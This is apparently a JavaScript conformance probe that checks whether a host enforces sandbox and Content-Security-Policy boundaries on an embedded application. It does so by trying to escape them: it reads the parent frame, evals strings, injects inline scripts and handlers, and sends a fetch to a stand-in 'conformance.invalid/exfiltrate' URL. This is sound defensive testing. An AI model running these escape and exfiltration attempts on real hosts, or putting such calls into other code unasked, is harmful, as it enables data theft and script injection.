/**
 * The isolation probe.
 *
 * §7 of the specification can be checked from a file: a container carries its
 * own defect and its own verdict. §4 cannot. Whether the application runs at an
 * opaque origin, whether it can open a socket, whether an inline script it
 * injects executes — none of that is a property of the file. It is a property of
 * the host that mounted it, and the only way to find out is to be inside one and
 * try.
 *
 * So this container attacks the host that is running it, and reports what got
 * through. Every check is written from the attacker's side: each is something a
 * hostile application would attempt, and each must be impossible rather than
 * discouraged.
 *
 * ## Why violation events rather than failures
 *
 * "The fetch failed" proves nothing. A fetch fails on an aircraft, on a laptop
 * with the network off, and against a host that blocks nothing at all — the same
 * rejection in every case. What distinguishes them is the
 * `securitypolicyviolation` event, which fires only when the policy is what
 * stopped it. A check that cannot tell a real boundary from a missing network
 * would pass everywhere and mean nothing.
 */

const CLAUSES = {
  origin: "§4.1",
  shell: "§4.1",
  popup: "§4.1",
  network: "§4.2",
  socket: "§4.2",
  evaluation: "§4.2",
  inline: "§4.2",
  handler: "§4.2",
  storage: "§6",
};

/** Violations, collected from the moment this module starts. */
const violations = [];
document.addEventListener("securitypolicyviolation", (event) => {
  violations.push({
    directive: event.violatedDirective || event.effectiveDirective || "",
    uri: event.blockedURI || "",
  });
});

const sawViolation = (directive) =>
  violations.some((violation) => violation.directive.startsWith(directive));

/** A violation report can arrive a task after the thing that caused it. */
const settle = () => new Promise((resolve) => setTimeout(resolve, 50));

const results = [];

const record = (id, attempted, blocked, detail) =>
  results.push({
    id,
    clause: CLAUSES[id] ?? "",
    attempted,
    status: blocked ? "blocked" : "allowed",
    detail,
  });

async function run() {
  // §4.1 — the frame belongs to no origin, so nothing can be same-origin with
  // it. With allow-same-origin the application shares an origin with the shell
  // that contains it, and every other guarantee becomes decorative.
  record(
    "origin",
    "Read this frame's origin",
    window.origin === "null" || window.origin === undefined,
    `window.origin = ${String(window.origin)}`,
  );

  // §4.1 — reading the shell is the first step in rewriting the bootloader that
  // a save seals into the next copy.
  let shell;
  try {
    shell = window.parent.document ? "readable" : "absent";
  } catch (error) {
    shell = `blocked: ${error.name}`;
  }
  record("shell", "Reach the shell's document", shell.startsWith("blocked"), shell);

  // §4.1 — window.open carries a URL, a URL carries data, and no CSP directive
  // governs it.
  let opened = null;
  try {
    opened = window.open("about:blank");
  } catch {
    opened = null;
  }
  if (opened) opened.close();
  record("popup", "Open a window", opened === null, opened ? "a window opened" : "returned null");

  // §4.2 — connect-src 'none' is the invariant the format rests on. The address
  // is one that resolves nowhere, so a host that fails this check has been
  // caught by its policy rather than by the network.
  try {
    await fetch("https://conformance.invalid/exfiltrate", { mode: "no-cors" });
  } catch {
    /* Expected. What matters is whether the policy is what stopped it. */
  }
  await settle();
  record(
    "network",
    "Send a request to another host",
    sawViolation("connect-src"),
    sawViolation("connect-src")
      ? "connect-src reported a violation"
      : "no connect-src violation was reported: the request may have failed for some other reason",
  );

  // §4.2 — a socket is a network host by another name.
  let socket = "opened";
  try {
    const connection = new WebSocket("wss://conformance.invalid/");
    connection.close();
  } catch (error) {
    socket = `blocked: ${error.name}`;
  }
  await settle();
  record(
    "socket",
    "Open a WebSocket",
    socket.startsWith("blocked") || sawViolation("connect-src"),
    socket,
  );

  // §4.2 — 'unsafe-eval' must not be granted. A string that becomes code is how
  // a value in the database becomes an instruction.
  let evaluated;
  try {
    // eslint-disable-next-line no-eval
    evaluated = `ran: ${(0, eval)("1 + 1")}`;
  } catch (error) {
    evaluated = `blocked: ${error.name}`;
  }
  record("evaluation", "Evaluate a string as code", evaluated.startsWith("blocked"), evaluated);

  // §4.2 — anything introduced after the compiler sealed the container carries
  // no nonce and must not execute. This is the check that fails the moment
  // 'unsafe-inline' appears in a policy.
  const injected = document.createElement("script");
  injected.textContent = "window.__probeInlineRan = true;";
  document.body.appendChild(injected);
  await settle();
  record(
    "inline",
    "Inject an inline script with no nonce",
    window.__probeInlineRan !== true,
    window.__probeInlineRan === true ? "the injected script ran" : "the injected script did not run",
  );

  // §4.2 — a nonce never authorises an inline event handler whatever its value,
  // and a handler is the sink a stored value reaches most easily.
  const button = document.createElement("button");
  button.setAttribute("onclick", "window.__probeHandlerRan = true;");
  button.hidden = true;
  document.body.appendChild(button);
  button.click();
  await settle();
  record(
    "handler",
    "Attach an inline event handler",
    window.__probeHandlerRan !== true,
    window.__probeHandlerRan === true ? "the handler ran" : "the handler did not run",
  );

  // §6 — not isolation, but the same promise: what the application stores has
  // to travel in the file. A real localStorage at an opaque origin throws; a
  // host is required to hand the application an in-memory stand-in instead.
  let storage;
  try {
    window.localStorage.setItem("probe", "1");
    storage =
      window.localStorage.getItem("probe") === "1" ? "a stand-in is present" : "reads returned null";
  } catch (error) {
    storage = `threw: ${error.name}`;
  }
  record("storage", "Use localStorage", storage === "a stand-in is present", storage);

  report();
}

function report() {
  const failures = results.filter((result) => result.status !== "blocked");

  const body = document.getElementById("results");
  body.textContent = "";
  for (const result of results) {
    const row = document.createElement("tr");
    row.className = result.status;
    for (const value of [result.clause, result.attempted, `${result.status} — ${result.detail}`]) {
      const cell = document.createElement("td");
      cell.textContent = value;
      row.appendChild(cell);
    }
    body.appendChild(row);
  }

  const verdict = document.getElementById("verdict");
  verdict.dataset.state = failures.length === 0 ? "pass" : "fail";
  verdict.className = `verdict ${failures.length === 0 ? "pass" : "fail"}`;
  verdict.textContent =
    failures.length === 0
      ? `This host holds every boundary the specification requires (${results.length} checks).`
      : `${failures.length} of ${results.length} boundaries are not there: ` +
        failures.map((failure) => failure.id).join(", ");

  // For a harness driving this without a person looking at it. Sent to the
  // shell, which is the only window an isolated frame can address.
  try {
    window.parent.postMessage(
      { type: "dai:isolation-report", suite: "dai-isolation", version: 1, results },
      "*",
    );
  } catch {
    /* A host that does not listen is not a failure of the host. */
  }
}

run().catch((error) => {
  const verdict = document.getElementById("verdict");
  verdict.dataset.state = "error";
  verdict.className = "verdict fail";
  // A probe that crashes must not be mistaken for a probe that passed.
  verdict.textContent = `The probe itself failed to run: ${String(error)}`;
});
